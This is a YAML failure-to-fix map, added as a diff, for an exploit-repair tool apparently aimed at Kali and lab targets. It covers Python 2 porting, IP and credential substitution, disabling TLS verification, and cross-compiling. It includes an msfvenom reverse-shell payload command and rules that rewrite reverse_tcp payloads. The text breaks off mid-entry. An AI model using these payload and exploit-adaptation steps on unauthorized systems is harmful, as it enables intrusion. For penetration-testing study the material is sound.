@@ -1,0 +1,978 @@
+# failure_map.yaml — exploitfixr.sh failure-mode → fix map
+#
+# Schema (per exploitfixr design spec §3):
+#   - key:          stable identifier (kebab-case)
+#     category:     pinned per spec §3 — do not invent new categories
+#     confidence:   definite | likely | speculative
+#     impact:       will-fix | may-fix | masks-symptom
+#     fix_locality: single-line | multi-line | replacement
+#     detect:
+#       file_patterns:  list of regex (matched against exploit file contents)
+#       error_patterns: list of regex (matched against --error / --error-file / stdin)
+#       state_patterns: list of state-vector cross-checks (special tokens, see classify.py)
+#       precedence:     integer (higher = preferred tiebreaker within a tier)
+#     fix:
+#       kind: regex-sub | line-insert | line-delete | shebang-swap |
+#             substitute-placeholder | dump-only | command-only
+#       spec: regex substitution (sed-style: s/PAT/REPL/[g]) or block of code,
+#             depending on kind
+#     paste_command: optional one-liner shown in FIXED COMMAND mode
+#     explanation:   one or two sentences, operator-facing
+#     references:    list of {corpus_slug | vault_path}
+#
+# Ranking (§5, deterministic): confidence → impact → fix_locality → precedence
+# → key alphabetical. Same discipline as stuckr's symptom_map.
+#
+# Substitution conventions: see lib/substitutions.md. Six placeholders.
+# 10.10.14.x is NEVER substituted (Kali VPN side).
+#
+# Gaps: entries that cannot be authored confidently go to
+# exploitdb/data/seed/failure_map_gaps.md, not guessed into this file.
+#
+# Last updated: 2026-05-20
+#==============================================================================
+
+# ── language-version ─────────────────────────────────────────────────────────
+- key: python2-print-statement
+  category: language-version
+  confidence: definite
+  impact: will-fix
+  fix_locality: single-line
+  detect:
+    file_patterns:
+      - '(?m)^\s*print\s+[^(\s][^\n]*$'
+    error_patterns:
+      - "SyntaxError:\\s*Missing parentheses in call to 'print'"
+    state_patterns: []
+    precedence: 180
+  fix:
+    kind: regex-sub
+    spec: |
+      s/^(\s*)print\s+(.+)$/\1print(\2)/g
+  paste_command: null
+  explanation: |
+    Exploit uses Python 2 `print` statement; modern Kali ships only Python 3.
+    Converts each top-level `print foo` to `print(foo)`.
+  references:
+    - vault_path: vault/_CHEATSHEETS/Fixing_Exploits.md#python-2--python-3
+
+- key: python2-shebang
+  category: language-version
+  confidence: definite
+  impact: will-fix
+  fix_locality: single-line
+  detect:
+    file_patterns:
+      - '(?m)^#!\s*/usr/bin/(?:env\s+)?python2(?:\.\d)?\s*$'
+      - '(?m)^#!\s*/usr/bin/python\s*$'
+    error_patterns:
+      - '/usr/bin/env:\s*[\x27"]?python2?[\x27"]?:\s*No such file or directory'
+    state_patterns: []
+    precedence: 170
+  fix:
+    kind: shebang-swap
+    spec: '#!/usr/bin/env python3'
+  paste_command: null
+  explanation: |
+    Shebang resolves to a missing python2 binary on modern Kali. Swap to
+    `#!/usr/bin/env python3`. Pair with `python2-print-statement` /
+    `urllib-deprecated` fixes if the body uses Py2 idioms.
+  references:
+    - vault_path: vault/_CHEATSHEETS/Fixing_Exploits.md#section-1-quick-failure-triage
+
+- key: urllib-deprecated
+  category: language-version
+  confidence: definite
+  impact: will-fix
+  fix_locality: multi-line
+  detect:
+    file_patterns:
+      - '(?m)^\s*import\s+urllib2\b'
+      - '(?m)^\s*from\s+urllib\s+import\s+urlopen\b'
+      - '(?m)^\s*from\s+urllib2\s+import\b'
+    error_patterns:
+      - "ModuleNotFoundError:\\s*No module named 'urllib2'"
+      - "ImportError:\\s*No module named urllib2"
+    state_patterns: []
+    precedence: 160
+  fix:
+    kind: regex-sub
+    spec: |
+      s/^(\s*)import\s+urllib2\b.*$/\1import urllib.request as urllib2/g
+      s/^(\s*)from\s+urllib2\s+import\s+(.+)$/\1from urllib.request import \2/g
+      s/^(\s*)from\s+urllib\s+import\s+urlopen\s*$/\1from urllib.request import urlopen/g
+  paste_command: null
+  explanation: |
+    `urllib2` was removed in Python 3; symbols moved to `urllib.request`.
+    Aliasing `urllib.request as urllib2` keeps existing call sites working.
+  references:
+    - vault_path: vault/_CHEATSHEETS/Fixing_Exploits.md#python-2--python-3
+
+- key: bytes-vs-string-py3
+  category: language-version
+  confidence: likely
+  impact: will-fix
+  fix_locality: single-line
+  detect:
+    file_patterns:
+      - '\.send\(\s*"[^"]*"\s*\)'
+      - '\.sendall\(\s*"[^"]*"\s*\)'
+    error_patterns:
+      - "TypeError:\\s*a bytes-like object is required, not 'str'"
+      - "TypeError:\\s*str does not support the buffer interface"
+    state_patterns: []
+    precedence: 140
+  fix:
+    kind: regex-sub
+    spec: |
+      s/\.send\(\s*"([^"]*)"\s*\)/.send(b"\1")/g
+      s/\.sendall\(\s*"([^"]*)"\s*\)/.sendall(b"\1")/g
+  paste_command: null
+  explanation: |
+    Socket send/sendall require `bytes`, not `str`, under Python 3. Prefixes
+    the literal with `b`. Only touches `.send(...)` / `.sendall(...)` calls.
+  references:
+    - vault_path: vault/_CHEATSHEETS/Fixing_Exploits.md#python-2--python-3
+
+# ── dependency ───────────────────────────────────────────────────────────────
+- key: missing-import
+  category: dependency
+  confidence: definite
+  impact: will-fix
+  fix_locality: single-line
+  detect:
+    file_patterns: []
+    error_patterns:
+      - "ModuleNotFoundError:\\s*No module named '(?P<mod>[A-Za-z0-9_.]+)'"
+      - "ImportError:\\s*No module named (?P<mod>[A-Za-z0-9_.]+)"
+    state_patterns: []
+    precedence: 150
+  fix:
+    kind: command-only
+    spec: null
+  paste_command: "pipx install {mod} || pip3 install --break-system-packages {mod}"
+  explanation: |
+    Python can't find the module the exploit imports. Try pipx first
+    (preferred on Kali); fall back to pip3 with --break-system-packages.
+    Captures module name from the error via named group `mod`.
+  references:
+    - vault_path: vault/_CHEATSHEETS/Fixing_Exploits.md#missing-dependencies
+
+- key: pip-package-missing
+  category: dependency
+  confidence: likely
+  impact: will-fix
+  fix_locality: single-line
+  detect:
+    file_patterns:
+      - '(?m)^\s*from\s+(?:Crypto|impacket|pwn|requests_ntlm)\b'
+    error_patterns:
+      - "No module named ['\"]?Crypto"
+      - "No module named ['\"]?impacket"
+      - "No module named ['\"]?pwn"
+    state_patterns: []
+    precedence: 130
+  fix:
+    kind: command-only
+    spec: null
+  paste_command: "pipx install pycryptodome impacket pwntools requests-ntlm"
+  explanation: |
+    Exploit needs a third-party crypto/protocol/exploitation library not in
+    Kali's default Python. The package name often differs from the import
+    name (e.g. `Crypto` → `pycryptodome`).
+  references:
+    - vault_path: vault/_CHEATSHEETS/Fixing_Exploits.md#missing-dependencies
+
+- key: wrong-python-version-installed
+  category: dependency
+  confidence: definite
+  impact: will-fix
+  fix_locality: single-line
+  detect:
+    file_patterns: []
+    error_patterns:
+      - '/usr/bin/env:\s*[\x27"]?python2?[\x27"]?:\s*No such file or directory'
+      - "python2:\\s*command not found"
+    state_patterns: []
+    precedence: 120
+  fix:
+    kind: command-only
+    spec: null
+  paste_command: "sudo apt install -y python2 && python2 <exploit>"
+  explanation: |
+    Modern Kali ships only python3. If the exploit genuinely requires Py2
+    semantics (not just a syntax difference), install python2. Prefer
+    porting the exploit (python2-print-statement / urllib-deprecated) when
+    feasible — installing python2 is a workaround, not a fix.
+  references:
+    - vault_path: vault/_CHEATSHEETS/Fixing_Exploits.md#python-2--python-3
+
+- key: pep668-externally-managed
+  category: dependency
+  confidence: definite
+  impact: will-fix
+  fix_locality: single-line
+  detect:
+    file_patterns: []
+    error_patterns:
+      - "error:\\s*externally-managed-environment"
+      - "This environment is externally managed"
+    state_patterns: []
+    precedence: 110
+  fix:
+    kind: command-only
+    spec: null
+  paste_command: "pipx install <package>   # or: pip3 install --break-system-packages <package>"
+  explanation: |
+    Kali enforces PEP 668 — `pip3 install <pkg>` is blocked outside a venv.
+    Use pipx for tools (one venv per tool), or pass `--break-system-packages`
+    when the install genuinely belongs in system Python.
+  references:
+    - corpus_slug: ad-enum-bloodhound-collection
+    - vault_path: vault/_CHEATSHEETS/Fixing_Exploits.md#missing-dependencies
+
+# ── network-substitution ─────────────────────────────────────────────────────
+- key: hardcoded-target-ip
+  category: network-substitution
+  confidence: definite
+  impact: will-fix
+  fix_locality: single-line
+  detect:
+    file_patterns:
+      - '\b10\.10\.(?:10|11|12|13)\.\d+\b'
+      - '\b192\.168\.\d+\.\d+\b'
+      - '\b172\.16\.\d+\.\d+\b'
+      - '\bTARGET(?:_IP)?\b'
+      - '<TARGET(?:_IP)?>|<IP>|<RHOST>|<HOST>'
+    error_patterns: []
+    state_patterns:
+      - bound-target-required
+    precedence: 200
+  fix:
+    kind: substitute-placeholder
+    spec: target-ip
+  paste_command: null
+  explanation: |
+    Exploit hardcodes a non-target IP (HTB-style 10.10.10.x, RFC1918, or a
+    bare TARGET placeholder). Substitutes the bound target IP. 10.10.14.x
+    is never substituted (Kali VPN side — see lib/substitutions.md).
+  references:
+    - vault_path: vault/_CHEATSHEETS/Fixing_Exploits.md#section-2-pre-edit-checklist
+
+- key: hardcoded-attacker-ip
+  category: network-substitution
+  confidence: definite
+  impact: will-fix
+  fix_locality: single-line
+  detect:
+    file_patterns:
+      - 'LHOST\s*=\s*["\x27]?\d{1,3}(?:\.\d{1,3}){3}["\x27]?'
+      - 'KALI_IP|ATTACKER_IP'
+      - 'callback\s*=\s*["\x27]?https?://\d{1,3}(?:\.\d{1,3}){3}'
+    error_patterns: []
+    state_patterns:
+      - kali-ip-resolvable
+    precedence: 190
+  fix:
+    kind: substitute-placeholder
+    spec: kali-ip
+  paste_command: null
+  explanation: |
+    Exploit hardcodes a callback / LHOST address that isn't this Kali's
+    tun0. Substitutes `$KALI_IP` or `ip -4 addr show tun0` result. Leaves
+    10.10.14.x literals untouched.
+  references:
+    - vault_path: vault/_CHEATSHEETS/Fixing_Exploits.md#regenerate-shellcode--always
+
+- key: hardcoded-port
+  category: network-substitution
+  confidence: speculative
+  impact: may-fix
+  fix_locality: single-line
+  detect:
+    file_patterns:
+      - '\bport\s*=\s*\d{2,5}\b'
+      - '\bPORT\s*=\s*\d{2,5}\b'
+    error_patterns:
+      - "ConnectionRefusedError"
+      - "Connection refused"
+    state_patterns:
+      - port-mismatch-from-services
+    precedence: 90
+  fix:
+    kind: dump-only
+    spec: null
+  paste_command: null
+  explanation: |
+    Exploit's hardcoded port doesn't appear in the target's nmap services.
+    Classification-only — operator inspects the state vector and edits the
+    port literal manually (too many false positives for auto-rewrite).
+  references:
+    - vault_path: vault/_CHEATSHEETS/Fixing_Exploits.md#section-2-pre-edit-checklist
+
+- key: hardcoded-creds
+  category: network-substitution
+  confidence: likely
+  impact: will-fix
+  fix_locality: single-line
+  detect:
+    file_patterns:
+      - '(?i)\b(?:username|user|login)\s*=\s*["\x27](?:admin|root|administrator|test|guest)["\x27]'
+      - '(?i)\b(?:password|passwd|pass|pwd)\s*=\s*["\x27][^"\x27]+["\x27]'
+      - "'Password1'"
+      - '\bjdoe\b'
+    error_patterns:
+      - "401\\s*Unauthorized"
+      - "403\\s*Forbidden"
+      - "Authentication failed"
+    state_patterns:
+      - creds-available
+    precedence: 140
+  fix:
+    kind: substitute-placeholder
+    spec: creds
+  paste_command: null
+  explanation: |
+    Exploit has placeholder/sample creds; state has a real cred from
+    spraying or recon. Substitutes username and password (preserves single
+    quotes on `'Password1'` — see lib/substitutions.md §5).
+  references:
+    - vault_path: vault/_CHEATSHEETS/Fixing_Exploits.md#section-4-fixing-python-web-exploits
+
+- key: hardcoded-url-path
+  category: network-substitution
+  confidence: speculative
+  impact: may-fix
+  fix_locality: single-line
+  detect:
+    file_patterns:
+      - 'base_url\s*=\s*["\x27]https?://[^"\x27]+/[^"\x27/]+/'
+      - 'url\s*=\s*["\x27]https?://[^"\x27]+/(?:cmsms|joomla|wordpress|admin)/'
+    error_patterns:
+      - "404\\s*Not Found"
+      - "Page not found"
+    state_patterns:
+      - web-paths-known
+    precedence: 80
+  fix:
+    kind: dump-only
+    spec: null
+  paste_command: null
+  explanation: |
+    Exploit's base URL contains a subdirectory (`/cmsms/`, `/joomla/`,
+    `/admin/`) that may not match the target's deployment. Classification-
+    only — operator compares with discovered web_paths and edits manually.
+  references:
+    - vault_path: vault/_CHEATSHEETS/Fixing_Exploits.md#url-path
+
+# ── tls ──────────────────────────────────────────────────────────────────────
+- key: ssl-verify-failure
+  category: tls
+  confidence: definite
+  impact: will-fix
+  fix_locality: single-line
+  detect:
+    file_patterns:
+      - 'requests\.(?:get|post|put|delete|patch|head)\([^)]*\)'
+    error_patterns:
+      - "SSLError"
+      - "CERTIFICATE_VERIFY_FAILED"
+      - "ssl\\.SSLCertVerificationError"
+    state_patterns: []
+    precedence: 170
+  fix:
+    kind: regex-sub
+    spec: |
+      s/(requests\.(?:get|post|put|delete|patch|head)\([^)]*?)\)/\1, verify=False)/g
+  paste_command: null
+  explanation: |
+    Lab targets use self-signed certs; the `requests` library rejects by
+    default. Inserts `verify=False` into every `requests.*` call. Pairs
+    with `ssl-warning-spam` to suppress the resulting urllib3 noise.
+  references:
+    - vault_path: vault/_CHEATSHEETS/Fixing_Exploits.md#ssl--https
+
+- key: ssl-warning-spam
+  category: tls
+  confidence: definite
+  impact: masks-symptom
+  fix_locality: multi-line
+  detect:
+    file_patterns:
+      - 'requests\.(?:get|post|put|delete|patch|head)\('
+      - 'verify\s*=\s*False'
+    error_patterns:
+      - "InsecureRequestWarning"
+    state_patterns: []
+    precedence: 100
+  fix:
+    kind: line-insert
+    spec: |
+      # Insert after the last `import` line:
+      import urllib3
+      urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+  paste_command: null
+  explanation: |
+    Silences urllib3's InsecureRequestWarning so real exploit output isn't
+    drowned in repeated warnings. Cosmetic — does not fix exploit behavior.
+  references:
+    - vault_path: vault/_CHEATSHEETS/Fixing_Exploits.md#ssl--https
+
+- key: tls-version-mismatch
+  category: tls
+  confidence: likely
+  impact: may-fix
+  fix_locality: multi-line
+  detect:
+    file_patterns: []
+    error_patterns:
+      - "SSLV3_ALERT_HANDSHAKE_FAILURE"
+      - "TLSV1_ALERT_PROTOCOL_VERSION"
+      - "wrong version number"
+    state_patterns: []
+    precedence: 90
+  fix:
+    kind: line-insert
+    spec: |
+      # Insert before the offending requests call:
+      import ssl
+      ctx = ssl.create_default_context()
+      ctx.set_ciphers('DEFAULT@SECLEVEL=0')
+      ctx.minimum_version = ssl.TLSVersion.TLSv1
+      # Pass through `requests` with a custom HTTPAdapter or use the ssl
+      # context directly with urllib if requests can't honor it.
+  paste_command: null
+  explanation: |
+    Target requires TLS 1.0/1.1 or weak ciphers that modern OpenSSL
+    disables by default. Lowers SECLEVEL to 0 and allows older TLS.
+    Multi-line fix — operator should verify the insertion point is above
+    the first network call.
+  references:
+    - vault_path: vault/_CHEATSHEETS/Fixing_Exploits.md#ssl--https
+
+# ── payload ──────────────────────────────────────────────────────────────────
+- key: wrong-payload-arch
+  category: payload
+  confidence: likely
+  impact: will-fix
+  fix_locality: single-line
+  detect:
+    file_patterns:
+      - 'msfvenom\s+-p\s+windows/(?!x64)'
+      - 'windows/shell_reverse_tcp\b'
+    error_patterns: []
+    state_patterns:
+      - target-arch-x64
+    precedence: 130
+  fix:
+    kind: regex-sub
+    spec: |
+      s|msfvenom\s+-p\s+windows/shell_reverse_tcp|msfvenom -p windows/x64/shell_reverse_tcp|g
+      s|msfvenom\s+-p\s+windows/meterpreter/reverse_tcp|msfvenom -p windows/x64/meterpreter/reverse_tcp|g
+  paste_command: null
+  explanation: |
+    Target state vector says x64 but msfvenom is generating x86 payload.
+    Swaps `windows/` to `windows/x64/`. Arch mismatch is silent at the
+    network layer — exploit appears to succeed and produces no shell.
+  references:
+    - vault_path: vault/_CHEATSHEETS/Fixing_Exploits.md#architecture-mismatch-is-silent
+
+- key: wrong-payload-os
+  category: payload
+  confidence: definite
+  impact: will-fix
+  fix_locality: replacement
+  detect:
+    file_patterns:
+      - 'msfvenom\s+-p\s+(?P<arch>windows|linux)/'
+    error_patterns: []
+    state_patterns:
+      - target-os-mismatch
+    precedence: 160
+  fix:
+    kind: dump-only
+    spec: null
+  paste_command: null
+  explanation: |
+    Payload OS family doesn't match target OS from state vector.
+    Classification-only — replacing the payload requires choosing a new
+    msfvenom invocation, target-specific shellcode encoders, and
+    different bad-char sets. Operator regenerates from scratch.
+  references:
+    - vault_path: vault/_CHEATSHEETS/Fixing_Exploits.md#regenerate-shellcode--always
+
+- key: shellcode-needs-regen
+  category: payload
+  confidence: definite
+  impact: will-fix
+  fix_locality: replacement
+  detect:
+    file_patterns:
+      - 'shellcode\s*=\s*\(?\s*b?["\x27]\\x[0-9a-fA-F]{2}'
+      - 'buf\s*=\s*b?""'
+      - 'payload\s*\+?=\s*b?["\x27]\\x'
+    error_patterns: []
+    state_patterns:
+      - shellcode-present
+    precedence: 150
+  fix:
+    kind: command-only
+    spec: null
+  paste_command: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={kali_ip} LPORT=443 EXITFUNC=thread -f python -b '\\x00\\x0a\\x0d'"
+  explanation: |
+    Exploit embeds a shellcode blob that almost certainly encodes the
+    original author's LHOST/LPORT. Regenerate for your Kali IP and paste
+    the new `shellcode = b"\\x..."` block in. Always use EXITFUNC=thread.
+  references:
+    - vault_path: vault/_CHEATSHEETS/Fixing_Exploits.md#regenerate-shellcode--always
+
+- key: exitfunc-thread
+  category: payload
+  confidence: definite
+  impact: will-fix
+  fix_locality: single-line
+  detect:
+    file_patterns:
+      - 'EXITFUNC\s*=\s*process'
+    error_patterns:
+      - "shell (?:died|exited|disconnected) immediately"
+    state_patterns: []
+    precedence: 140
+  fix:
+    kind: regex-sub
+    spec: |
+      s/EXITFUNC\s*=\s*process/EXITFUNC=thread/g
+  paste_command: null
+  explanation: |
+    EXITFUNC=process kills the entire vulnerable service after shellcode
+    runs, dropping the shell. EXITFUNC=thread cleans up the thread only,
+    keeping the shell alive.
+  references:
+    - vault_path: vault/_CHEATSHEETS/Fixing_Exploits.md#regenerate-shellcode--always
+
+# ── compile ──────────────────────────────────────────────────────────────────
+- key: compile-error-glibc
+  category: compile
+  confidence: definite
+  impact: will-fix
+  fix_locality: single-line
+  detect:
+    file_patterns: []
+    error_patterns:
+      - "GLIBC_[0-9]+\\.[0-9]+'?\\s+not found"
+      - "version\\s+`GLIBC_[0-9]+\\.[0-9]+'\\s+not found"
+    state_patterns: []
+    precedence: 150
+  fix:
+    kind: command-only
+    spec: null
+  paste_command: "gcc -static -o exploit exploit.c   # or build on a matching distro"
+  explanation: |
+    Binary was built on a system with a newer glibc than the target has.
+    Static linking sidesteps the dynamic dependency. For C++ exploits use
+    `-static-libstdc++ -static-libgcc` instead.
+  references:
+    - vault_path: vault/_CHEATSHEETS/Fixing_Exploits.md#section-3-cross-compiling-c-exploits-windows-targets
+
+- key: compile-error-missing-header
+  category: compile
+  confidence: definite
+  impact: will-fix
+  fix_locality: single-line
+  detect:
+    file_patterns: []
+    error_patterns:
+      - "fatal error:\\s+(?P<hdr>[A-Za-z0-9_./-]+\\.h):\\s+No such file or directory"
+    state_patterns: []
+    precedence: 140
+  fix:
+    kind: command-only
+    spec: null
+  paste_command: "apt-cache search {hdr}   # then: sudo apt install -y <dev-package>"
+  explanation: |
+    Missing C header — usually `libfoo-dev` is not installed. apt-cache
+    search by the header filename usually surfaces the right -dev package.
+  references: []
+
+- key: missing-cross-compiler
+  category: compile
+  confidence: definite
+  impact: will-fix
+  fix_locality: single-line
+  detect:
+    file_patterns: []
+    error_patterns:
+      - "(?:i686|x86_64)-w64-mingw32-gcc:\\s+command not found"
+      - "mingw32:\\s+command not found"
+    state_patterns: []
+    precedence: 130
+  fix:
+    kind: command-only
+    spec: null
+  paste_command: "sudo apt install -y mingw-w64"
+  explanation: |
+    mingw-w64 not installed. Provides `i686-w64-mingw32-gcc` (x86) and
+    `x86_64-w64-mingw32-gcc` (x64) for cross-compiling Windows binaries
+    from Kali.
+  references:
+    - vault_path: vault/_CHEATSHEETS/Fixing_Exploits.md#section-3-cross-compiling-c-exploits-windows-targets
+
+- key: wrong-target-arch
+  category: compile
+  confidence: likely
+  impact: will-fix
+  fix_locality: single-line
+  detect:
+    file_patterns:
+      - 'i686-w64-mingw32-gcc'
+      - 'gcc\s+.*\s+-m32\b'
+    error_patterns: []
+    state_patterns:
+      - target-arch-x64
+    precedence: 110
+  fix:
+    kind: regex-sub
+    spec: |
+      s/i686-w64-mingw32-gcc/x86_64-w64-mingw32-gcc/g
+      s/\bgcc\s+(.*)\s+-m32\b/gcc \1 -m64/g
+  paste_command: null
+  explanation: |
+    Compile invocation is 32-bit but state vector says target is x64.
+    Swaps the toolchain prefix or `-m32` flag. Re-verify with `file
+    exploit.exe` after building.
+  references:
+    - vault_path: vault/_CHEATSHEETS/Fixing_Exploits.md#section-3-cross-compiling-c-exploits-windows-targets
+
+- key: missing-winsock-link
+  category: compile
+  confidence: definite
+  impact: will-fix
+  fix_locality: single-line
+  detect:
+    file_patterns:
+      - '#include\s+<winsock2?\.h>'
+      - '#include\s+<ws2tcpip\.h>'
+    error_patterns:
+      - "undefined reference to\\s+`(?:socket|connect|send|recv|WSAStartup)"
+    state_patterns: []
+    precedence: 120
+  fix:
+    kind: command-only
+    spec: null
+  paste_command: "x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32"
+  explanation: |
+    Windows socket symbols (`socket`, `WSAStartup`, etc.) need explicit
+    linkage against Winsock. Add `-lws2_32` to the cross-compile command.
+  references:
+    - vault_path: vault/_CHEATSHEETS/Fixing_Exploits.md#section-3-cross-compiling-c-exploits-windows-targets
+
+# ── protocol ─────────────────────────────────────────────────────────────────
+- key: wrong-http-method
+  category: protocol
+  confidence: likely
+  impact: will-fix
+  fix_locality: single-line
+  detect:
+    file_patterns:
+      - 'requests\.(?P<meth>get|post|put|delete|patch)\('
+    error_patterns:
+      - "405\\s*Method Not Allowed"
+      - '"status":\s*405\b'
+    state_patterns: []
+    precedence: 100
+  fix:
+    kind: dump-only
+    spec: null
+  paste_command: null
+  explanation: |
+    Target rejected the HTTP verb (405 Method Not Allowed). Classification-
+    only — choosing the right verb requires reading the endpoint's API or
+    the target's response headers (which list allowed methods).
+  references: []
+
+- key: csrf-token-param-changed
+  category: protocol
+  confidence: definite
+  impact: will-fix
+  fix_locality: multi-line
+  detect:
+    file_patterns:
+      - 'csrf[_ ]?(?:param|token|name)\s*=\s*["\x27](?P<old>[^"\x27]+)["\x27]'
+      - '\.split\(\s*["\x27][a-zA-Z_]+\s*=\s*["\x27]\s*\)\[1\]'
+    error_patterns:
+      - "IndexError:\\s+list index out of range"
+    state_patterns: []
+    precedence: 130
+  fix:
+    kind: line-insert
+    spec: |
+      # Add immediately before the failing parse:
+      print("[DEBUG] csrf parser raw input:", location, flush=True)
+      # Read the printed value, then update the csrf_param literal in the
+      # exploit to the actual parameter name shown.
+  paste_command: null
+  explanation: |
+    CSRF token parameter name changed between exploit-author's version and
+    your target. Inserts a debug print so the operator can see the real
+    parameter name and update the literal in one place.
+  references:
+    - vault_path: vault/_CHEATSHEETS/Fixing_Exploits.md#csrf-token-issues
+
+# ── runtime-environment ──────────────────────────────────────────────────────
+- key: connection-refused
+  category: runtime-environment
+  confidence: definite
+  impact: will-fix
+  fix_locality: single-line
+  detect:
+    file_patterns: []
+    error_patterns:
+      - "ConnectionRefusedError"
+      - "\\[Errno 111\\]\\s+Connection refused"
+      - "Connection refused"
+    state_patterns:
+      - port-mismatch-from-services
+    precedence: 120
+  fix:
+    kind: dump-only
+    spec: null
+  paste_command: "nc -nv {target} {port}   # verify port is actually open"
+  explanation: |
+    Target refused the TCP connection — wrong port, service down, or
+    firewalled. Cross-check with `state.services` (open ports from nmap)
+    before re-running. Often pairs with `hardcoded-port`.
+  references:
+    - vault_path: vault/_CHEATSHEETS/Fixing_Exploits.md#section-1-quick-failure-triage
+
+- key: connection-timeout
+  category: runtime-environment
+  confidence: definite
+  impact: will-fix
+  fix_locality: single-line
+  detect:
+    file_patterns: []
+    error_patterns:
+      - "ConnectionTimeoutError"
+      - "TimeoutError"
+      - "\\[Errno 110\\]\\s+Connection timed out"
+      - "socket\\.timeout"
+    state_patterns: []
+    precedence: 110
+  fix:
+    kind: dump-only
+    spec: null
+  paste_command: "ip route get {target}   # confirm route; then: ping -c2 {target}"
+  explanation: |
+    No response from target — routing problem, VPN dropped, or wrong IP.
+    Verify the route first; VPN drops are the most common cause mid-engagement.
+  references:
+    - vault_path: vault/_CHEATSHEETS/Fixing_Exploits.md#section-1-quick-failure-triage
+
+- key: dns-resolution-failure
+  category: runtime-environment
+  confidence: definite
+  impact: will-fix
+  fix_locality: single-line
+  detect:
+    file_patterns:
+      - 'https?://[a-zA-Z][a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
+    error_patterns:
+      - "gaierror"
+      - "Name or service not known"
+      - "Temporary failure in name resolution"
+      - "NXDOMAIN"
+    state_patterns: []
+    precedence: 100
+  fix:
+    kind: dump-only
+    spec: null
+  paste_command: "echo '{target} {host}' | sudo tee -a /etc/hosts"
+  explanation: |
+    Exploit hardcodes a hostname Kali can't resolve. Add a /etc/hosts entry
+    mapping the host to the target IP. Common for AD-DNS-only hostnames.
+  references: []
+
+- key: port-in-use
+  category: runtime-environment
+  confidence: definite
+  impact: will-fix
+  fix_locality: single-line
+  detect:
+    file_patterns: []
+    error_patterns:
+      - "\\[Errno 98\\]\\s+Address already in use"
+      - "OSError:\\s+\\[Errno 98\\]"
+      - "bind:\\s+Address already in use"
+    state_patterns: []
+    precedence: 100
+  fix:
+    kind: dump-only
+    spec: null
+  paste_command: "sudo ss -lntp | grep ':{port}\\b'   # then kill the holding PID"
+  explanation: |
+    Listener bind failed — another process already holds the port (often
+    a leftover `nc` or Penelope handler). Find the holder and decide
+    whether to kill it or move to a different port.
+  references: []
+
+- key: permission-denied-listener
+  category: runtime-environment
+  confidence: definite
+  impact: will-fix
+  fix_locality: single-line
+  detect:
+    file_patterns:
+      - '\.bind\(\(?.{0,40},\s*(?:80|443|53|21|22)\b'
+    error_patterns:
+      - "PermissionError:\\s+\\[Errno 13\\]\\s+Permission denied"
+      - "bind:\\s+Permission denied"
+    state_patterns: []
+    precedence: 90
+  fix:
+    kind: dump-only
+    spec: null
+  paste_command: "sudo python3 <exploit>   # or change listener port to >=1024"
+  explanation: |
+    Binding to a privileged port (<1024) without root. Easiest fix: change
+    the listener port literal to something ≥1024. If the protocol requires
+    a low port, run as root.
+  references: []
+
+# ── cross-os-mismatch ────────────────────────────────────────────────────────
+- key: windows-exploit-on-linux-host
+  category: cross-os-mismatch
+  confidence: definite
+  impact: masks-symptom
+  fix_locality: replacement
+  detect:
+    file_patterns:
+      - '#include\s+<windows\.h>'
+      - 'WSAStartup\b|CreateRemoteThread\b|VirtualAllocEx\b'
+      - 'msfvenom\s+-p\s+windows/'
+    error_patterns: []
+    state_patterns:
+      - target-os-linux
+    precedence: 90
+  fix:
+    kind: dump-only
+    spec: null
+  paste_command: null
+  explanation: |
+    Exploit targets Windows APIs / Windows payload format but state vector
+    says target is Linux. Classification-only — find a Linux equivalent.
+  references: []
+
+- key: linux-exploit-on-windows-host
+  category: cross-os-mismatch
+  confidence: definite
+  impact: masks-symptom
+  fix_locality: replacement
+  detect:
+    file_patterns:
+      - '#include\s+<sys/(?:socket|mman|ptrace)\.h>'
+      - 'msfvenom\s+-p\s+linux/'
+      - '/bin/(?:bash|sh)\b'
+    error_patterns: []
+    state_patterns:
+      - target-os-windows
+    precedence: 80
+  fix:
+    kind: dump-only
+    spec: null
+  paste_command: null
+  explanation: |
+    Exploit uses Linux syscalls / shells / payload format but target is
+    Windows. Classification-only — find a Windows equivalent.
+  references: []
+
+# ── unfixable-classify-only ──────────────────────────────────────────────────
+- key: wrong-vuln-class-entirely
+  category: unfixable-classify-only
+  confidence: speculative
+  impact: masks-symptom
+  fix_locality: replacement
+  detect:
+    file_patterns: []
+    error_patterns: []
+    state_patterns:
+      - exploit-vuln-class-mismatch
+    precedence: 70
+  fix:
+    kind: dump-only
+    spec: null
+  paste_command: null
+  explanation: |
+    Exploit targets a different vulnerability class than what the state
+    vector suggests (e.g. Tomcat-manager-upload PoC against a JBoss target).
+    Dumps corpus pointers for the relevant vuln class for the operator to
+    pick from.
+  references: []
+
+- key: version-out-of-range
+  category: unfixable-classify-only
+  confidence: speculative
+  impact: masks-symptom
+  fix_locality: replacement
+  detect:
+    file_patterns:
+      - '(?i)affected\s+versions?:\s*[<>=]+\s*[\d.]+'
+      - '(?i)tested\s+on\s+version\s+[\d.]+'
+    error_patterns: []
+    state_patterns: []
+    precedence: 60
+  fix:
+    kind: dump-only
+    spec: null
+  paste_command: null
+  explanation: |
+    Exploit annotates a version range; recon shows target outside it.
+    Patching the version literal in the exploit does not patch the
+    vulnerability. Classification-only — find a different exploit.
+  references: []
+
+- key: requires-prior-rce
+  category: unfixable-classify-only
+  confidence: speculative
+  impact: masks-symptom
+  fix_locality: replacement
+  detect:
+    file_patterns:
+      - '(?i)#\s*(?:authenticated|post-auth|after\s+RCE)'
+      - '(?i)def\s+(?:upload_webshell|post_exploit|after_login)'
+    error_patterns: []
+    state_patterns:
+      - no-foothold
+    precedence: 60
+  fix:
+    kind: dump-only
+    spec: null
+  paste_command: null
+  explanation: |
+    Exploit assumes prior code execution / authenticated session / uploaded
+    webshell. Foothold state is 'no'. Classification-only — get the initial
+    foothold first, then re-run.
+  references: []
+
+- key: requires-debugger-or-lab-prep
+  category: unfixable-classify-only
+  confidence: speculative
+  impact: masks-symptom
+  fix_locality: replacement
+  detect:
+    file_patterns:
+      - '(?i)!mona\s+(?:pattern|jmp|seh)'
+      - '(?i)immunity\s+debugger|windbg|x64dbg'
+      - '(?i)find\s+offset|find_bad_chars'
+    error_patterns: []
+    state_patterns: []
+    precedence: 50
+  fix:
+    kind: dump-only
+    spec: null
+  paste_command: null
+  explanation: |
+    Exploit requires lab-prep work (mona scripts, debugger attach, offset
